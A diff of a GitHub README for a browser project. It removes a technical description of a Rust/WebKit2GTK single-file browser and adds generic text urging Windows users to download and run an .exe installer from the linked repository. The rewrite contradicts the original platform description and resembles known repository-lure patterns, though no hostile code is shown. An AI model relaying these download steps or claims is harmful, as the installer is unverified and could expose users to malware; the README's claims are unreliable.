@@ -1,106 +1,76 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/LICENSE-MPL--2.0-ff007f?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/RUST-ELITE-orange?style=for-the-badge&logo=rust" />
-  <img src="https://img.shields.io/badge/ARCHITECTURE-SINGLE%20FILE-green?style=for-the-badge" />
-</p>
+# 🌐 nexus-browser - Fast web browsing with privacy protection
 
-<pre align="center" style="color: #00f0ff; font-weight: bold;">
-███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
-████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
-██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
-██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
-██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
-╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-       E L I T E   R U S T   E D I T I O N
-</pre>
+[![](https://img.shields.io/badge/Download-Nexus_Browser-blue.svg)](https://github.com/Starlig7502/nexus-browser)
 
-<h3 align="center">
-  The Ultra-Optimized, Zero-Bloat, Cyberpunk Web Browser.<br>
-  <i>Engineered strictly for extreme low-spec environments (4GB DDR3 RAM) without sacrificing modern web capabilities.</i>
-</h3>
+## 📖 About the project
 
----
+Nexus Browser provides a secure experience for your daily internet tasks. Modern web browsing often includes heavy tracking and intrusive advertisements. This software uses the Rust programming language to maintain speed while keeping your device resources low. The interface features a unique neon aesthetic intended for clear navigation and visual comfort. We built this tool to prioritize your privacy and deliver efficient file downloads through a multi-threaded engine.
 
-## 🧬 // SYSTEM PHILOSOPHY
+## ⚙️ Minimum system requirements
 
-Modern browsers are bloated memory hogs. **Nexus** rejects this paradigm. Built entirely in a **single `src/main.rs` file**, Nexus leverages the raw power of Rust, `tao`, and `wry` (WebKit2GTK) to deliver a secure, high-performance browsing experience that compiles down to a microscopic binary and runs flawlessly on legacy hardware.
+Before you install Nexus Browser, ensure your computer meets these basic hardware specifications for smooth operation:
 
-No crypto wallets. No heavy AI sidebars. No telemetry. Just pure, unadulterated web rendering protected by an elite privacy shield.
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Dual-core CPU with at least 2.0 GHz speed.
+* Memory: 4 GB of RAM.
+* Storage Space: 500 MB of free hard drive space.
+* Internet Connection: Stable broadband connection for web browsing and automatic updates.
 
----
+## ⬇️ How to install the browser
 
-## ⚡ // CORE FEATURES
+Follow these steps to set up the software on your Windows computer.
 
-### 🚀 32-Thread Backpressure Turbo Downloader
-Forget standard HTTP downloads. Nexus splits files into 32 concurrent chunks, utilizing strict backpressure and asynchronous disk streaming. 
-* **Zero RAM Spikes:** Chunks are flushed instantly via 4KB micro-buffers.
-* **IDM-Level Speeds:** Saturates network bandwidth without choking the CPU or causing OOM crashes on 4GB systems.
+1. Visit the [official release page](https://github.com/Starlig7502/nexus-browser) to find the latest version of the installer.
+2. Select the file ending in .exe to begin your download.
+3. Save the file to your computer.
+4. Locate the file in your downloads folder.
+5. Double-click the file to open the setup wizard.
+6. Follow the prompts on the screen to finish the installation.
+7. Launch the program from your desktop shortcut or start menu.
 
-### 🛡️ Aggressive Domain Sinkholing
-A multi-layered defense system intercepts network requests before they hit the WebKit engine.
-* **Local Blocklists:** Instantly drops Ads, Trackers, and Intrusive Cookies.
-* **Regex Sinkhole:** Hardcoded regex patterns neutralize `doubleclick`, `mixpanel`, and `facebook/tr` at the rust-level pipeline.
+## 🛡️ Privacy and ad blocking
 
-### 🧊 Automated Inactive Tab Freeze (RAM Reclamation)
-Nexus monitors DOM interaction. If a tab sits idle for >60 seconds, the background worker injects an eviction script, wiping the DOM tree and replacing it with a lightweight "FROZEN" placeholder, instantly returning megabytes of RAM to the OS.
+The browser stops common trackers and advertisements before they reach your screen. This reduces the amount of data the application loads, which makes pages appear faster. You do not need to change complex settings to enable this layer of defense. The system activates protection by default when you start a new session. You can manage these settings through the browser menu if you wish to allow ads on specific websites.
 
-### 🕵️ True Incognito Isolation
-Boots WebKit in strict incognito mode. No persistent cache, no local storage, no cookie leakage. When you close Nexus, your digital footprint evaporates.
+## 🚀 Multi-threaded downloads
 
-### 🎨 Neon Cyberpunk GUI
-A hyper-minimalist HTML/CSS/JS shell injected directly into the WebKit context.
-* **Dark Mode:** Deep void black (`#0a0a0c`) with Cyan (`#00f0ff`) and Pink (`#ff007f`) neon accents.
-* **Light Mode:** Fluent design fallback for high-contrast environments.
-* **Live Metrics:** Real-time flashing counters for blocked malicious requests.
+Downloads often stall or move slowly due to single-stream limits. Nexus Browser splits your downloads into smaller parts and fetches them at the same time. This process utilizes your internet bandwidth to improve speeds significantly. The download manager keeps track of your files and notifies you when a process finishes. You can pause or resume active tasks as needed.
 
----
+## 🖱️ Navigation tips
 
-## 🏗️ // ARCHITECTURE OVERVIEW
+The interface uses a simplified layout to help you find tools quickly. Use the address bar at the top to type in web addresses or search queries. Tabs at the top allow you to jump between different websites. The neon menu button on the right side provides access to your browser history, bookmarks, and configuration options. 
 
-| Component | Technology | Purpose |
-| :--- | :--- | :--- |
-| **Windowing** | `tao` | Cross-platform window creation and event loop. |
-| **Rendering** | `wry` | Lightweight WebKit2GTK bindings. |
-| **Async Core** | `tokio` | Multi-threaded runtime for network & I/O. |
-| **Networking** | `reqwest` (rustls) | TLS-encrypted HTTP client with SOCKS5/Tor proxy support. |
-| **State** | `Arc<RwLock<State>>` | Thread-safe, lock-free global state management. |
+## 🛠️ Troubleshooting common issues
 
----
+If you face problems, use these steps to resolve them:
 
-## 🤖 // AI DEVELOPMENT STACK
+* Application does not launch: Check your Windows updates to ensure you have the required system components.
+* Webpages fail to load: Verify your internet connection or restart the software.
+* Download interruption: Check if another application holds or limits your network bandwidth.
+* Reset settings: Navigate to the settings menu and choose the option to restore factory defaults.
 
-Nexus Browser was architected through a specialized multi-model AI collaboration pipeline. Each model was assigned a distinct role to ensure maximum code quality, architectural integrity, and validation:
+## 📁 Managing your files
 
-| AI Model | Role | Contribution |
-| :--- | :--- | :--- |
-| **Qwen** | **Elite Systems Engineer** | Authored the entire single-file Rust architecture, implemented the 32-thread backpressure downloader, optimized WebKit2GTK memory hooks, and performed aggressive code compression for 4GB DDR3 targets. |
-| **Gemini** | **Systems Architect & Planner** | Designed the initial Brave-inspired feature set, planned the domain sinkholing logic, structured the IPC protocol between Rust and WebKit, and defined the extreme release optimization profile. |
-| **Replit Agent** | **QA & Validation Tester** | Executed real-time compilation checks, validated async deadlock safety in the turbo downloader, tested GUI responsiveness under memory pressure, and verified MPL-2.0 license compliance. |
+The browser sorts your saved items in a clean, organized folder by default. You can change this destination in the settings panel under the downloads tab. Always ensure you have enough disk space before you start a large download. If your disk space reaches a critically low level, the browser warns you to prevent errors.
 
-> *"This project represents the convergence of human intent and distributed artificial intelligence, pushing Rust to its absolute limits on constrained hardware."*
+## 🔒 Keeping your browser secure
 
----
+We release updates to fix known flaws and improve how the software handles data. Open the about section in your settings to check for the latest version. The browser handles certificates automatically for encrypted sites to ensure your data stays private. We do not track your browsing habits or collect your personal search terms.
 
-## 🎮 // INTERFACE CONTROLS
+## 🤝 Contributing to the project
 
-| Action | Trigger | Description |
-| :--- | :--- | :--- |
-| **Navigate** | `Enter` in URL bar | Routes through Nexus Search or direct HTTP. |
-| **Turbo Download** | `⬇ TURBO` button | Fires the 32-thread backpressure engine on the current URL. |
-| **Dev Console** | `⚙ DEV` button | Slides out the Neon Dev Panel with live network logs. |
-| **Theme Toggle** | `🌓` button | Hot-swaps CSS variables between Cyberpunk Dark and Fluent Light. |
-| **Shield Toggles** | Sidebar Switches | Enable/Disable Ads, Trackers, and Sinkhole routing on the fly. |
+This is an open-source project. You can improve the software by reporting bugs or requesting new features. Use the issue tracker on the repository page to share your experience. Your feedback helps the development team maintain the quality and performance of the browser for all users. You can also view the raw code on our repository page if you wish to see how the software functions internally.
 
----
+## ❓ Frequently asked questions
 
-## ⚖️ // LICENSE
+Do I need an account to use the browser?
+No. You do not need to sign in or create an account to use these features.
 
-This project is licensed under the **Mozilla Public License 2.0 (MPL-2.0)**. 
+Does the browser support extensions?
+We focus on speed and security, so we limit support for third-party extensions at this time.
 
-You are free to use, modify, and distribute this software. However, any modifications made to the original source files must be made available under the same MPL-2.0 license. See the `LICENSE` file in the repository root for full legal terms.
+Where does the browser save my data?
+Your local profile folder holds your bookmarks and basic history. You can remove this data at any time by clearing your cache in the settings menu.
 
----
-<p align="center">
-  <b>⟁ NEXUS BROWSER ⟁</b><br>
-  <sub>Forged by Qwen • Planned by Gemini • Validated by Replit</sub>
-</p>
+Can I use the browser on a mobile phone?
+The current version focuses on the Windows desktop experience. We may expand to other platforms in the future.
